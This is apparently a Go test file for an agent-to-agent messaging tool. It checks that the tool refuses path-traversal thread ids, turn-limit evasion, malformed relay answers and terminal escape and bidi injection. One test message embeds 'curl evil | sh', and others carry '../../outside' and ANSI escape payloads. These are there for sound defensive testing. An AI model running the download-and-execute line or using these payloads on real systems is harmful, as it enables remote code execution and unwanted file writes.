package auu

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/tropeforce7/agentuucp/internal/envelope"
	"github.com/tropeforce7/agentuucp/internal/identity"
	"github.com/tropeforce7/agentuucp/internal/message"
	"github.com/tropeforce7/agentuucp/internal/relay"
	"github.com/tropeforce7/agentuucp/internal/relayapi"
	"github.com/tropeforce7/agentuucp/internal/store"
)

// The second adversarial trace, at v0.9.0: what a received message
// controls on an expert host.

// sealByHand is an envelope from one user to another with the inner record
// exactly as given, signed with the sender's real key and sealed to the
// recipient: what a client that is not auu's would send, since auu's own
// refuses a body that fails Validate before it seals. The wire constants
// are written here as literals, from outside the package that defines
// them, as damaged_test does.
func sealByHand(t *testing.T, from, to *user, inner *envelope.Inner) *envelope.Envelope {
	t.Helper()
	s, err := store.Open(from.home)
	if err != nil {
		t.Fatal(err)
	}
	id, err := s.Identity()
	if err != nil {
		t.Fatal(err)
	}
	return sealInnerByHand(t, id, mustParseBundle(t, mustBundle(t, to)), inner)
}

// A thread id is a message id, and serve builds the thread's directory and
// the worktree's path from it. The trace sent `--thread "../../outside"`
// from an admitted peer: serve joined it onto its directory, wrote the
// message's text there, asked git for a worktree there, and when that
// failed ended the round with an error and nothing in the ledger, so the
// same message ended every later round the same way. Now the shape is a
// rule of the format: the message is refused as malformed when it is
// opened, kept under damaged and acknowledged, and serve never sees it.
func TestAThreadIDThatIsAPathNeverReachesServe(t *testing.T) {
	alice, bob := newExpert(t, modeSideCopy)
	root := filepath.Join(bob.home, "serve")
	outside := filepath.Join(bob.home, "outside")

	env := sealByHand(t, alice, bob.user, &envelope.Inner{
		ID: "0123456789abcdef0123456789abcdef", Time: time.Now().UTC(),
		Body:    message.Body{Type: message.TypeAsk, Thread: "../../outside", Subject: "hello", Text: "please look"},
		Channel: "jostle",
	})
	s, err := store.Open(alice.home)
	if err != nil {
		t.Fatal(err)
	}
	id, err := s.Identity()
	if err != nil {
		t.Fatal(err)
	}
	r, err := s.DefaultRelay()
	if err != nil {
		t.Fatal(err)
	}
	c, err := dial(s, id, r)
	if err != nil {
		t.Fatal(err)
	}
	relayID, err := c.Post(t.Context(), env, "jostle")
	if err != nil {
		t.Fatalf("post: %v", err)
	}

	var out string
	stderr := captureStderr(t, func() { out, err = bob.tryRun("serve", "--once", "--json") })
	if err != nil {
		t.Fatalf("serve --once ended with an error on a message whose thread id is \"../../outside\": %v\n%s\n%s", err, out, stderr)
	}
	var report roundJSON
	if err := json.Unmarshal([]byte(out), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Answered)+len(report.Failed)+len(report.Skipped) != 0 {
		t.Fatalf("serve saw the message: %+v", report)
	}
	if _, statErr := os.Stat(outside); statErr == nil {
		t.Errorf("a peer's thread id \"../../outside\" made serve write %s, outside %s", outside, root)
	}
	// Refused as malformed when it was opened: kept under damaged, with
	// the word for it, and acknowledged.
	bobStore, err := store.Open(bob.home)
	if err != nil {
		t.Fatal(err)
	}
	if rec := damagedRecord(t, bobStore, bob.defaultRelayName(), relayID); rec.Cause != "malformed" {
		t.Errorf("kept as %q, want malformed", rec.Cause)
	}
	if msgs, err := bobStore.List(store.Inbox); err != nil {
		t.Fatal(err)
	} else if len(msgs) != 0 {
		t.Errorf("the message reached the inbox: %+v", msgs[0].Inner.Body)
	}
	// The next round is clean: the message is not met again, and the
	// expert answers what comes after it.
	if report := bob.round(t); len(report.Failed) != 0 || len(report.Answered) != 0 {
		t.Fatalf("the second round was not clean: %+v", report)
	}
	sent := alice.ask(t, "jostle", "after it", "still there?")
	if report := bob.round(t); len(report.Answered) != 1 || report.Answered[0].ID != sent.ID {
		t.Fatalf("the ask behind it was not answered: %+v", report)
	}
}

// auu's own send refuses a thread id of the wrong shape before anything is
// read or sealed, with a usage error naming the shape; so does --reply-to.
func TestSendRefusesAThreadIDThatIsNotAMessageID(t *testing.T) {
	relayURL := startRelay(t)
	alice := newUser(t, "alice", relayURL)
	bob := newUser(t, "bob", relayURL)
	alice.run("peers", "add", bob.exportLine())
	for _, tc := range []struct{ flag, value string }{
		{"--thread", "../x"},
		{"--thread", "t1"},
		{"--thread", "0123456789ABCDEF0123456789abcdef"},
		{"--reply-to", "../x"},
	} {
		_, err := alice.tryRun("send", "--to", "bob", tc.flag, tc.value, "hello")
		var exit *exitError
		if !errors.As(err, &exit) || exit.code != exitUsage {
			t.Fatalf("%s %s: %v, want a usage error", tc.flag, tc.value, err)
		}
		if !strings.Contains(err.Error(), tc.flag+" "+`"`+tc.value+`"`) ||
			!strings.Contains(err.Error(), "not a message id (32 lowercase hex characters)") {
			t.Fatalf("%s %s: %q does not name the flag and the shape", tc.flag, tc.value, err)
		}
	}
	// And the shape is the whole rule: an id that is not a thread this
	// home knows is still a thread id.
	alice.run("send", "--to", "bob", "--thread", "fedcba9876543210fedcba9876543210", "hello")
}

// A record in the spool with a thread id of the wrong shape can only have
// been written by hand, since every message that arrives has been through
// Validate; serve still checks before the id is joined onto anything, and
// it is that message's failure, written in the ledger and stepped over,
// never the run's: the message behind it is answered in the same round.
func TestServeRecordsABadThreadIDAgainstTheMessageAndGoesOn(t *testing.T) {
	alice, bob := newExpert(t, modeSideCopy)
	outside := filepath.Join(bob.home, "outside")
	s, err := store.Open(bob.home)
	if err != nil {
		t.Fatal(err)
	}
	crafted := &store.Stored{
		Relay:    bob.defaultRelayName(),
		Received: time.Now().UTC().Add(-time.Minute),
		Inner: &envelope.Inner{
			From: alice.exportFingerprint(), To: bob.exportFingerprint(),
			ID: "0123456789abcdef0123456789abcdef", Time: time.Now().UTC().Add(-time.Minute),
			Body: message.Body{Type: message.TypeAsk, Thread: "../../outside", Subject: "by hand", Text: "written into the spool"},
		},
		SenderName: "alice",
		Channel:    "jostle",
	}
	if err := s.Save(store.Inbox, crafted); err != nil {
		t.Fatal(err)
	}
	sent := alice.ask(t, "jostle", "after it", "please look")

	out, err := bob.tryRun("serve", "--once", "--json")
	var exit *exitError
	if !errors.As(err, &exit) || exit.code != exitUsage {
		t.Fatalf("a round with one failure ended %v, want the usage exit that says so\n%s", err, out)
	}
	var report roundJSON
	if err := json.Unmarshal([]byte(out), &report); err != nil {
		t.Fatal(err)
	}
	if len(report.Failed) != 1 || report.Failed[0].ID != crafted.Inner.ID {
		t.Fatalf("failed: %+v, want the crafted message", report.Failed)
	}
	if len(report.Answered) != 1 || report.Answered[0].ID != sent.ID {
		t.Fatalf("answered: %+v, want the ask behind it", report.Answered)
	}
	if entry := bob.ledgerOf(t).Messages[crafted.Inner.ID]; entry == nil || entry.Failures != 1 {
		t.Fatalf("the ledger has %+v for the crafted message, want one failure", entry)
	}
	if _, statErr := os.Stat(outside); statErr == nil {
		t.Errorf("the thread id was joined onto a path: %s exists", outside)
	}
	// serve ls neither joins the name onto a path nor prints it raw.
	ls := bob.run("serve", "ls")
	if strings.Contains(ls, "../../outside") || !strings.Contains(ls, `"../../outsid"  0 turns`) {
		t.Errorf("serve ls printed the thread id raw or not at all:\n%s", ls)
	}
	// And worktreeFor refuses it on its own, though handle never lets it
	// this far.
	if _, _, err := worktreeFor(filepath.Join(bob.home, "serve"), bob.row, "../../outside",
		t.TempDir(), true); err == nil || !strings.Contains(err.Error(), "not a message id") {
		t.Errorf("worktreeFor took a thread id that is a path: %v", err)
	}
}

// A follow-up is admitted because its in_reply_to names a reply serve sent,
// and the turns are counted by thread. The trace answered each of serve's
// replies under a fresh thread id and was on turn one every time, so
// max_turns was not a limit. Now a reply that names a thread other than
// the one its answer was sent on is nobody's here: it is not answered, the
// original thread's count does not move, and the message stays in the
// inbox like any other that is none of serve's business, said once. The
// follow-up on the right thread past max_turns is still refused, which
// TestServeAnswersAFollowUpUntilTheTurnsRunOut proves.
func TestARenamedFollowUpIsNotAnswered(t *testing.T) {
	alice, bob := newExpert(t, modeReadOnly)
	bob.row.MaxTurns = 1
	bob.write(t)

	sent := alice.ask(t, "jostle", "first", "please look")
	first := bob.round(t)
	if len(first.Answered) != 1 {
		t.Fatalf("the ask was not answered: %+v", first)
	}
	reply := alice.replyOn(t, sent.Thread)

	// A follow-up to serve's reply under a thread id of the sender's own
	// choosing: what a client other than auu's would send, since auu reply
	// copies the thread of the message it answers.
	t.Setenv("AUU_HOME", alice.home)
	s, id, err := loadIdentity()
	if err != nil {
		t.Fatal(err)
	}
	r, err := selectRelay(s, "")
	if err != nil {
		t.Fatal(err)
	}
	recipient, err := s.Resolve("bob")
	if err != nil {
		t.Fatal(err)
	}
	renamed := strings.Repeat("b", 32)
	body := message.Body{
		Type: message.TypeReply, Subject: "again", Thread: renamed,
		InReplyTo: reply.ID, Text: "and again",
	}
	followUp, _, err := sendSealed(s, id, r, recipient, body, nil, sendMode{})
	if err != nil {
		t.Fatal(err)
	}

	var out string
	stderr := captureStderr(t, func() { out, err = bob.tryRun("serve", "--once", "--json") })
	if err != nil {
		t.Fatalf("serve --once: %v\n%s", err, out)
	}
	var second roundJSON
	if err := json.Unmarshal([]byte(out), &second); err != nil {
		t.Fatal(err)
	}
	if n := len(second.Answered); n != 0 {
		t.Errorf("with max_turns 1 and one turn already answered, a follow-up to serve's reply under a new thread id was answered (%d answered this round); "+
			"expected it to be left alone", n)
	}
	if len(second.Failed)+len(second.Skipped) != 0 {
		t.Errorf("the follow-up was counted as work: %+v", second)
	}
	led := bob.ledgerOf(t)
	if n := led.answered(sent.Thread); n != 1 {
		t.Errorf("the original thread has %d turns answered, want 1", n)
	}
	if _, ok := led.Messages[followUp.ID]; ok {
		t.Errorf("the renamed follow-up was written into the ledger: %+v", led.Messages[followUp.ID])
	}
	want := fmt.Sprintf("auu: %s from alice answers reply %s on thread %s but names thread %s; left alone",
		shortID(followUp.ID), shortID(reply.ID), shortID(sent.Thread), shortID(renamed))
	if strings.Count(stderr, want) != 1 {
		t.Errorf("stderr:\n%s\nwant once:\n%s", stderr, want)
	}
	// Still in the inbox, unread, for the owner to see; and a second round
	// leaves it alone again.
	var in inboxJSON
	if err := json.Unmarshal([]byte(bob.run("inbox", "--no-fetch", "--json")), &in); err != nil {
		t.Fatal(err)
	}
	found := false
	for _, m := range in.Messages {
		if m.ID == followUp.ID {
			found = !m.Read
		}
	}
	if !found {
		t.Errorf("the renamed follow-up is not in the inbox unread: %+v", in.Messages)
	}
	if again := bob.round(t); len(again.Answered)+len(again.Failed) != 0 {
		t.Errorf("the second round did something with it: %+v", again)
	}
}

// A relay refuses an upload past its expiry with 410 and forgets it, so an
// interrupted upload whose reservation has lapsed cannot be resumed as it
// stands. The sender does not fail on that: --resume asks the relay where
// it got to, is told the upload is gone, opens a new one for the same
// sealed bytes and sends them all, and the message arrives once. The
// relay's clock is moved by hand between the cut and the resume.
func TestResumeReopensAnUploadThatExpiredBetweenPieces(t *testing.T) {
	var clockMu sync.Mutex
	now := time.Now()
	clock := func() time.Time {
		clockMu.Lock()
		defer clockMu.Unlock()
		return now
	}
	relayURL, gate := startInterruptibleRelayWith(t, 2, 64<<10, func(c *relay.Config) {
		c.UploadTTL = time.Hour
		c.Now = clock
	})
	alice := newUser(t, "alice", relayURL)
	bob := newUser(t, "bob", relayURL)
	alice.run("peers", "add", bob.exportLine())
	bob.run("peers", "add", alice.exportLine())
	alice.run("allow", "push")
	bob.run("allow", "push")

	payload := make([]byte, 400<<10)
	for i := range payload {
		payload[i] = byte(i*13 + 5)
	}
	file := filepath.Join(t.TempDir(), "lapsed.bin")
	if err := os.WriteFile(file, payload, 0o600); err != nil {
		t.Fatal(err)
	}
	if out, err := alice.tryRun("send", "--to", "bob", "--subject", "the lapsed one",
		"--attach", file, "here it is"); err == nil {
		t.Fatalf("the send should have failed with the relay cut off after two pieces:\n%s", out)
	}
	if passed, cut := gate.counts(); passed == 0 || cut == 0 {
		t.Fatalf("the gate let %d pieces through and cut %d; the test proves nothing", passed, cut)
	}
	before := onlyPending(t, alice)
	sealed, err := os.Stat(filepath.Join(alice.home, "outbox", before.MessageID+".stream"))
	if err != nil {
		t.Fatal(err)
	}

	// The reservation lapses while the sender is away.
	clockMu.Lock()
	now = now.Add(time.Hour + time.Minute)
	clockMu.Unlock()
	gate.open()
	passedBefore, _ := gate.counts()
	out := alice.run("send", "--resume")
	if strings.Contains(out, "nothing to resume") {
		t.Fatalf("--resume found nothing:\n%s", out)
	}
	// Reopened: the whole stream went again under a new upload id, from
	// the same sealed bytes, and the outbox is clear.
	passedAfter, _ := gate.counts()
	const piece = 64 << 10
	if whole := int((sealed.Size() + piece - 1) / piece); passedAfter-passedBefore != whole {
		t.Errorf("--resume sent %d pieces after the lapse; want the whole stream of %d, reopened", passedAfter-passedBefore, whole)
	}
	if entries, err := os.ReadDir(filepath.Join(alice.home, "outbox")); err == nil && len(entries) != 0 {
		t.Errorf("the outbox was not cleared after the reopened resume: %d entries", len(entries))
	}

	var got inboxJSON
	if err := json.Unmarshal([]byte(bob.run("inbox", "--json")), &got); err != nil {
		t.Fatal(err)
	}
	var found int
	var id string
	for _, m := range got.Messages {
		if m.Subject == "the lapsed one" {
			found++
			id = m.ID
		}
	}
	if found != 1 {
		t.Fatalf("the resumed message arrived %d times, want once: %+v", found, got.Messages)
	}
	dir := t.TempDir()
	bob.run("extract", id, "--out", dir)
	if back, err := os.ReadFile(filepath.Join(dir, "lapsed.bin")); err != nil || !bytes.Equal(back, payload) {
		t.Fatalf("the payload after the reopened upload differs (%v): %d bytes back, %d sent", err, len(back), len(payload))
	}
}

// A relay's answer is checked for shape before a command slices it: auu
// cert ls prints each serial's first sixteen characters, and a relay that
// answered a two-byte serial crashed it. The client refuses the listing,
// and the command prints the malformed-answer sentence, naming the field
// and the relay, and exits 2; a panic would fail the test on its own.
func TestCertLsRefusesAShortSerialRatherThanSlicingIt(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !strings.HasSuffix(r.URL.Path, "/certs") {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(relayapi.CertsResponse{Certs: []relayapi.CertRecord{{Serial: "ab", Label: "laptop"}}})
	}))
	defer srv.Close()
	home := t.TempDir()
	s, err := store.Open(home)
	if err != nil {
		t.Fatal(err)
	}
	id, err := identity.Generate("alice")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.SaveIdentity(id); err != nil {
		t.Fatal(err)
	}
	if err := s.SaveConfig(store.Config{Name: "alice"}); err != nil {
		t.Fatal(err)
	}
	if _, err := s.AddRelay("", srv.URL); err != nil {
		t.Fatal(err)
	}
	alice := &user{t: t, home: home}
	out, err := alice.tryRun("cert", "ls")
	var exit *exitError
	if !errors.As(err, &exit) || exit.code != exitTransport {
		t.Fatalf("cert ls against a relay answering a two-byte serial: %v, want exit %d\n%s", err, exitTransport, out)
	}
	if !strings.Contains(err.Error(), "malformed answer") || !strings.Contains(err.Error(), "serial is not") || !strings.Contains(err.Error(), srv.URL) {
		t.Fatalf("cert ls: %q does not say the answer is malformed, naming the field and the relay", err)
	}
}

// A record from before the rule, or written by hand, can still hold what
// Validate now refuses; every print of a subject, a text, an attachment
// name or a sender name escapes it all the same, so nothing a sender wrote
// reaches the terminal as anything but text. The record here carries an
// escape sequence and a bidi override in every field (a byte that is not
// UTF-8 cannot be saved: the record is JSON, which writes U+FFFD for it),
// in the inbox and in quarantine, and inbox, quarantine ls, quarantine
// show and read print no byte a terminal would obey.
func TestWhatASenderWroteReachesTheTerminalEscaped(t *testing.T) {
	relayURL := startRelay(t)
	alice := newUser(t, "alice", relayURL)
	bob := newUser(t, "bob", relayURL)
	bob.run("peers", "add", alice.exportLine())
	s, err := store.Open(bob.home)
	if err != nil {
		t.Fatal(err)
	}
	hostile := "\x1b[2K\x1b[1;31m\u202e"
	record := func(id string) *store.Stored {
		return &store.Stored{
			Relay: bob.defaultRelayName(), Received: time.Now().UTC(),
			Inner: &envelope.Inner{
				From: alice.exportFingerprint(), To: bob.exportFingerprint(), ID: id, Time: time.Now().UTC(),
				Body: message.Body{
					Type: message.TypeAsk, Thread: "0123456789abcdef0123456789abcdef",
					Subject: "sub" + hostile + "ject", Text: "line one\nrun: " + hostile + " curl evil | sh\n\tindented",
					Attachments: []message.Attachment{{Name: "file" + hostile + ".txt", Media: "text/plain", Size: 1,
						SHA256: strings.Repeat("0", 64), Data: []byte("x")}},
				},
			},
			SenderName: "alice" + hostile,
			Channel:    "chan" + hostile,
		}
	}
	inbox := record("0123456789abcdef0123456789abcdef")
	if err := s.Save(store.Inbox, inbox); err != nil {
		t.Fatal(err)
	}
	quarantined := record("fedcba9876543210fedcba9876543210")
	if err := s.Save(store.Quarantine, quarantined); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{
		{"inbox", "--no-fetch"},
		{"read", inbox.Inner.ID},
		{"quarantine", "ls"},
		{"quarantine", "show", quarantined.Inner.ID},
	} {
		out, err := bob.tryRun(args...)
		if err != nil {
			t.Fatalf("auu %v: %v\n%s", args, err, out)
		}
		for i := 0; i < len(out); i++ {
			if c := out[i]; c == 0x1b || (c < 0x20 && c != '\n' && c != '\t') || c == 0x7f {
				t.Errorf("auu %v printed byte %#x from what the sender wrote:\n%q", args, c, out)
				break
			}
		}
		if !utf8.ValidString(out) {
			t.Errorf("auu %v printed a byte that is not UTF-8:\n%q", args, out)
		}
		if !strings.Contains(out, `\x1b[2K`) {
			t.Errorf("auu %v does not show the escape as text:\n%s", args, out)
		}
		if strings.Contains(out, "\u202e") {
			t.Errorf("auu %v printed the bidi override:\n%q", args, out)
		}
	}
	// The text keeps its lines and its tab, and the read shows all three
	// of them escaped where they were.
	out := bob.run("read", inbox.Inner.ID)
	if !strings.Contains(out, "line one\nrun: \\x1b[2K\\x1b[1;31m\\u202e curl evil | sh\n\tindented") {
		t.Errorf("read did not keep the text's lines and tab while escaping the rest:\n%q", out)
	}
	if !strings.Contains(out, `file\x1b[2K`) || !strings.Contains(out, `from:    alice\x1b[2K`) || !strings.Contains(out, `channel: chan\x1b[2K`) {
		t.Errorf("read did not escape the name, the sender or the channel:\n%s", out)
	}
}

// truncate cuts on a rune boundary: a subject of wide characters cut by
// bytes left a broken final rune on the terminal.
func TestTruncateCutsOnARuneBoundary(t *testing.T) {
	for _, tc := range []struct {
		in   string
		n    int
		want string
	}{
		{"short", 10, "short"},
		{"exactly ten", 11, "exactly ten"},
		{"a long ascii subject", 8, "a long …"},
		{"中文中文中文", 4, "中文中…"},
		{"café au lait", 5, "café…"},
	} {
		got := truncate(tc.in, tc.n)
		if got != tc.want {
			t.Errorf("truncate(%q, %d) = %q, want %q", tc.in, tc.n, got, tc.want)
		}
		if !utf8.ValidString(got) {
			t.Errorf("truncate(%q, %d) = %q is not UTF-8", tc.in, tc.n, got)
		}
	}
}

// A file or an editor on Windows writes CRLF, and a carriage return is a
// control character the text rule refuses; a refusal naming U+000D at
// every send there would be the wrong sentence for an honest file. The
// sender's command folds CRLF to a line break in the one place every
// source of text passes before Validate, and what goes on the wire has no
// carriage return in it; a carriage return on its own is still refused,
// since the wire rule is unchanged.
func TestABodyFileWithWindowsLineEndingsSends(t *testing.T) {
	relayURL := startRelay(t)
	alice := newUser(t, "alice", relayURL)
	bob := newUser(t, "bob", relayURL)
	alice.run("peers", "add", bob.exportLine())
	bob.run("peers", "add", alice.exportLine())
	alice.run("allow", "push")
	bob.run("allow", "push")

	dir := t.TempDir()
	crlf := filepath.Join(dir, "windows.txt")
	if err := os.WriteFile(crlf, []byte("first line\r\nsecond line\r\n\r\n\tindented\r\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	var sent sentJSON
	if err := json.Unmarshal([]byte(alice.run("send", "--to", "bob", "--subject", "from windows", "--body-file", crlf, "--json")), &sent); err != nil {
		t.Fatal(err)
	}
	bob.run("inbox")
	var got messageJSON
	if err := json.Unmarshal([]byte(bob.run("read", sent.ID, "--json")), &got); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got.Text, "\r") {
		t.Errorf("a carriage return reached the wire: %q", got.Text)
	}
	if want := "first line\nsecond line\n\n\tindented\n"; got.Text != want {
		t.Errorf("the text arrived as %q, want %q", got.Text, want)
	}
	// Standard input the same.
	out, err := alice.withStdin("piped\r\nline\r\n", "send", "--to", "bob", "--subject", "from a pipe", "--json", "-")
	if err != nil {
		t.Fatalf("send from stdin: %v\n%s", err, out)
	}
	if err := json.Unmarshal([]byte(out), &sent); err != nil {
		t.Fatal(err)
	}
	bob.run("inbox")
	if err := json.Unmarshal([]byte(bob.run("read", sent.ID, "--json")), &got); err != nil {
		t.Fatal(err)
	}
	if got.Text != "piped\nline\n" {
		t.Errorf("the piped text arrived as %q", got.Text)
	}
	// A carriage return on its own is not a line ending, and the rule
	// refuses it by name.
	lone := filepath.Join(dir, "lone.txt")
	if err := os.WriteFile(lone, []byte("one\rtwo"), 0o600); err != nil {
		t.Fatal(err)
	}
	_, err = alice.tryRun("send", "--to", "bob", "--subject", "a lone return", "--body-file", lone)
	var exit *exitError
	if !errors.As(err, &exit) || exit.code != exitUsage || !strings.Contains(err.Error(), "text contains U+000D, a control character") {
		t.Errorf("a lone carriage return: %v, want the usage refusal naming U+000D", err)
	}
}

// auu reply THREAD answers the latest message on the thread, and latest
// is by arrival here, not by the stamp a sender chose: a record stamped a
// year ahead that arrived first is not the one answered. The records are
// saved by hand, since open now refuses a stamp from the future; a record
// from before that rule, or written by hand, is what this is for. And
// read shows the stamp as the sender's, beside when it arrived.
func TestReplyByThreadAnswersTheLatestArrivalNotTheLatestStamp(t *testing.T) {
	alice, bob := twoPeers(t)
	s, err := store.Open(bob.home)
	if err != nil {
		t.Fatal(err)
	}
	now := time.Now().UTC().Truncate(time.Second)
	const thread = "0123456789abcdef0123456789abcdef"
	record := func(id string, received, stamped time.Time, relayID int64, text string) *store.Stored {
		return &store.Stored{
			Relay: bob.defaultRelayName(), RelayID: relayID, Received: received,
			Inner: &envelope.Inner{
				From: alice.exportFingerprint(), To: bob.exportFingerprint(), ID: id, Time: stamped,
				Body: message.Body{Type: message.TypeAsk, Thread: thread, Subject: "the thread", Text: text},
			},
			SenderName: "alice",
		}
	}
	fromTheFuture := record("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", now.Add(-time.Hour), now.AddDate(1, 0, 0), 1, "stamped next year")
	honest := record("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb", now, now, 2, "stamped today")
	for _, m := range []*store.Stored{fromTheFuture, honest} {
		if err := s.Save(store.Inbox, m); err != nil {
			t.Fatal(err)
		}
	}
	var sent sentJSON
	if err := json.Unmarshal([]byte(bob.run("reply", thread[:12], "--json", "answering the thread")), &sent); err != nil {
		t.Fatal(err)
	}
	reply, err := s.Load(store.Sent, sent.ID)
	if err != nil {
		t.Fatal(err)
	}
	if reply.Inner.Body.InReplyTo != honest.Inner.ID {
		t.Errorf("reply THREAD answered %s; want the one that arrived last, %s", reply.Inner.Body.InReplyTo, honest.Inner.ID)
	}
	out := bob.run("read", fromTheFuture.Inner.ID)
	if !strings.Contains(out, "sent:    "+fromTheFuture.Inner.Time.Local().Format(time.RFC1123)+" (the sender's clock)") ||
		!strings.Contains(out, "received: "+fromTheFuture.Received.Local().Format(time.RFC1123)) {
		t.Errorf("read does not show the stamp as the sender's beside the arrival:\n%s", out)
	}
}
